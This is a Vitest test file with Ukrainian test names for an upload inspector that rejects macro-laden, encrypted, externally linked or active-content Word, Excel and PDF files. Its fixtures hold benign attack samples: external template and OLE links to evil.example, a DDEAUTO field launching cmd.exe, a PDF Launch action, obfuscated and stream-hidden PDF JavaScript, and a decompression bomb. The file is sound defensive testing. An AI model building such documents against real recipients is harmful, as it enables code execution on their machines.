import zlib from 'node:zlib';
import { describe, expect, it } from 'vitest';
import { docx, DOCM_MAIN, field, para, rels, simplePdf, stream, xlsx, zip } from './files.fixture';
import { extOf, inspectFile } from './index';

const reason = async (buf: Buffer, ext: 'docx' | 'xlsx' | 'pdf') => {
  const v = await inspectFile(buf, ext);
  return v.ok ? 'ok' : v.reason;
};

const OLE = Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]);
const ole = (...streams: string[]) => Buffer.concat([OLE, Buffer.alloc(504), ...streams.map((s) => Buffer.from(s, 'utf16le')), Buffer.alloc(512)]);

describe('розширення', () => {
  it('приймаються лише .docx, .xlsx, .pdf; старі — з порадою; з макросами за назвою — як макроси', async () => {
    expect(extOf('Рапорт.DOCX')).toEqual({ ext: 'docx' });
    expect(extOf('графік.xlsx')).toEqual({ ext: 'xlsx' });
    expect(extOf('наказ.pdf')).toEqual({ ext: 'pdf' });
    expect(extOf('старий.doc')).toEqual({ reason: 'template_old_format' });
    expect(extOf('старий.xls')).toEqual({ reason: 'template_old_format' });
    expect(extOf('макрос.docm')).toEqual({ reason: 'template_macros' });
    expect(extOf('програма.exe')).toEqual({ reason: 'template_bad_format' });
    expect(extOf('без розширення')).toEqual({ reason: 'template_bad_format' });
  });
});

describe('сигнатура замість розширення', () => {
  it('звичайні файли проходять', async () => {
    expect(await reason(docx(para('Рапорт')), 'docx')).toBe('ok');
    expect(await reason(xlsx(['Графік']), 'xlsx')).toBe('ok');
    expect(await reason(simplePdf('Order'), 'pdf')).toBe('ok');
  });
  it('підміна розширення: PDF під назвою .docx, docx під назвою .pdf, xlsx під назвою .docx', async () => {
    expect(await reason(simplePdf('x'), 'docx')).toBe('template_bad_format');
    expect(await reason(docx(para('x')), 'pdf')).toBe('template_bad_format');
    expect(await reason(xlsx(['x']), 'docx')).toBe('template_bad_format');
  });
  it('старий .doc, перейменований у .docx, — старий формат; зашифрований docx — пароль', async () => {
    expect(await reason(ole('WordDocument'), 'docx')).toBe('template_old_format');
    expect(await reason(ole('EncryptionInfo', 'EncryptedPackage'), 'docx')).toBe('template_password');
  });
  it('шифрований запис ZIP — пароль; не ZIP усередині — не вдалося перевірити', async () => {
    expect(await reason(zip({ '[Content_Types].xml': '', 'word/document.xml': '' }, { encrypted: true }), 'docx')).toBe('template_password');
    expect(await reason(Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.alloc(64)]), 'docx')).toBe('template_check_failed');
  });
});

describe('Word і Excel: має спрацювати', () => {
  it('VBA-проєкт, будь-де і будь-яким регістром', async () => {
    expect(await reason(docx(para('x'), { 'word/vbaProject.bin': 'VBA' }), 'docx')).toBe('template_macros');
    expect(await reason(xlsx(['x'], { 'xl/VBAPROJECT.BIN': 'VBA' }), 'xlsx')).toBe('template_macros');
  });
  it('docm, перейменований у docx (тип вмісту з макросами навіть без vbaProject)', async () => {
    expect(await reason(docx(para('x'), {}, DOCM_MAIN), 'docx')).toBe('template_macros');
  });
  it('макроаркуш Excel 4.0, ActiveX, вбудований OLE-об’єкт', async () => {
    expect(await reason(xlsx(['x'], { 'xl/macrosheets/sheet1.xml': '<xm/>' }), 'xlsx')).toBe('template_macros');
    expect(await reason(docx(para('x'), { 'word/activeX/activeX1.xml': '<ax/>' }), 'docx')).toBe('template_macros');
    expect(await reason(docx(para('x'), { 'word/embeddings/oleObject1.bin': 'OLE' }), 'docx')).toBe('template_macros');
  });
  it('підкинутий зовнішній шаблон і зовнішній OLE-об’єкт', async () => {
    const attached = rels([{ type: 'attachedTemplate', target: 'https://evil.example/t.dotm', external: true }]);
    expect(await reason(docx(para('x'), { 'word/_rels/settings.xml.rels': attached }), 'docx')).toBe('template_external');
    const ole2 = rels([{ type: 'oleObject', target: 'http://evil.example/x.rtf', external: true }]);
    expect(await reason(docx(para('x'), { 'word/_rels/document.xml.rels': ole2 }), 'docx')).toBe('template_external');
  });
  it('посилання Excel на інші книги', async () => {
    expect(await reason(xlsx(['x'], { 'xl/externalLinks/externalLink1.xml': '<e/>' }), 'xlsx')).toBe('template_external');
  });
  it('поле DDEAUTO, розбите на шматки між run-ами, і fldSimple з DDE', async () => {
    expect(await reason(docx(para('x') + field('DD', 'EAUTO c:\\\\windows\\\\cmd.exe "/c calc"')), 'docx')).toBe('template_macros');
    expect(await reason(docx('<w:p><w:fldSimple w:instr=" DDE Excel x"/></w:p>'), 'docx')).toBe('template_macros');
  });
});

describe('Word і Excel: не має спрацювати', () => {
  it('звичайне посилання на сайт і звичайні поля (сторінка, дата)', async () => {
    const link = rels([{ type: 'hyperlink', target: 'https://zakon.rada.gov.ua/', external: true }]);
    expect(await reason(docx(para('x') + field(' PAGE ') + field(' DATE \\@ "dd.MM.yyyy" '), { 'word/_rels/document.xml.rels': link }), 'docx')).toBe('ok');
  });
  it('графік у Word (дані графіка — вбудована книга .xlsx) і зображення', async () => {
    expect(await reason(docx(para('x'), { 'word/embeddings/Microsoft_Excel_Worksheet.xlsx': xlsx(['1']), 'word/media/image1.png': 'PNG' }), 'docx')).toBe('ok');
  });
  it('слово DDE у звичайному тексті — не поле', async () => {
    expect(await reason(docx(para('Протокол DDE і DDEAUTO')), 'docx')).toBe('ok');
  });
});

describe('PDF: має спрацювати', () => {
  it('JavaScript у дії відкриття', async () => {
    expect(await reason(simplePdf('x', { catalogExtra: '/OpenAction 6 0 R', extra: ['<< /S /JavaScript /JS (app.alert(1)) >>'] }), 'pdf')).toBe('template_pdf_active');
  });
  it('ім’я, сховане через #xx: /J#61vaScript', async () => {
    expect(await reason(simplePdf('x', { catalogExtra: '/OpenAction 6 0 R', extra: ['<< /S /J#61vaScript /J#53 (app.alert(1)) >>'] }), 'pdf')).toBe('template_pdf_active');
  });
  it('JavaScript усередині стисненого об’єктного потоку', async () => {
    const inner = zlib.deflateSync(Buffer.from('6 0 << /S /JavaScript /JS (app.alert(1)) >>', 'latin1'));
    expect(await reason(simplePdf('x', { extra: [stream('/Type /ObjStm /N 1 /First 4 /Filter /FlateDecode', inner)] }), 'pdf')).toBe('template_pdf_active');
  });
  it('стиснений потік із кодом, словник якого бреше про тип, і межі потоку, підроблені в рядку', async () => {
    const inner = zlib.deflateSync(Buffer.from('<< /S /JavaScript /JS (app.alert(1)) >>', 'latin1'));
    expect(await reason(simplePdf('x', { extra: [stream('/Type /XObject /Subtype /Image', inner)] }), 'pdf')).toBe('template_pdf_active');
    expect(await reason(simplePdf('x', { extra: ['(>> stream\n)', '<< /S /JavaScript /JS (1) >>', '(endstream)'] }), 'pdf')).toBe('template_pdf_active');
  });
  it('фільтр, яким можна сховати об’єктний потік (ASCIIHex), — не вдалося перевірити', async () => {
    expect(await reason(simplePdf('x', { extra: [stream('/Type /ObjStm /Filter /ASCIIHexDecode', '3c3c3e3e>')] }), 'pdf')).toBe('template_check_failed');
  });
  it('«бомба»: потік, що розпаковується понад межу, — не вдалося перевірити', async () => {
    const bomb = zlib.deflateSync(Buffer.alloc(300 << 20), { level: 9 });
    expect(await reason(simplePdf('x', { extra: [stream('/Filter /FlateDecode', bomb)] }), 'pdf')).toBe('template_check_failed');
  }, 20_000);
  it('запуск програми, вкладений файл', async () => {
    expect(await reason(simplePdf('x', { extra: ['<< /S /Launch /F (cmd.exe) >>'] }), 'pdf')).toBe('template_pdf_active');
    expect(await reason(simplePdf('x', { extra: [stream('/Type /EmbeddedFile', 'MZ')] }), 'pdf')).toBe('template_pdf_active');
  });
  it('зашифрований PDF — його не перевірити', async () => {
    expect(await reason(simplePdf('x', { trailerExtra: '/Encrypt 7 0 R ' }), 'pdf')).toBe('template_password');
  });
});

describe('PDF: не має спрацювати', () => {
  it('короткі імена на кшталт «/JS» у двійкових даних зображення не рахуються', async () => {
    const image = Buffer.concat([Buffer.from([0xff, 0xd8]), Buffer.from(' /JS (x) /AA ', 'latin1'), Buffer.from([0xff, 0xd9])]);
    expect(await reason(simplePdf('x', { extra: [stream('/Type /XObject /Subtype /Image /Filter /DCTDecode', image)] }), 'pdf')).toBe('ok');
  });
  it('стиснений текст сторінки без активних імен', async () => {
    const page = zlib.deflateSync(Buffer.from('BT /F1 12 Tf (Plain text) Tj ET', 'latin1'));
    expect(await reason(simplePdf('x', { extra: [stream('/Filter /FlateDecode', page)] }), 'pdf')).toBe('ok');
  });
  it('звичайне посилання на сайт', async () => {
    expect(await reason(simplePdf('x', { extra: ['<< /S /URI /URI (https://zakon.rada.gov.ua/) >>'] }), 'pdf')).toBe('ok');
  });
});
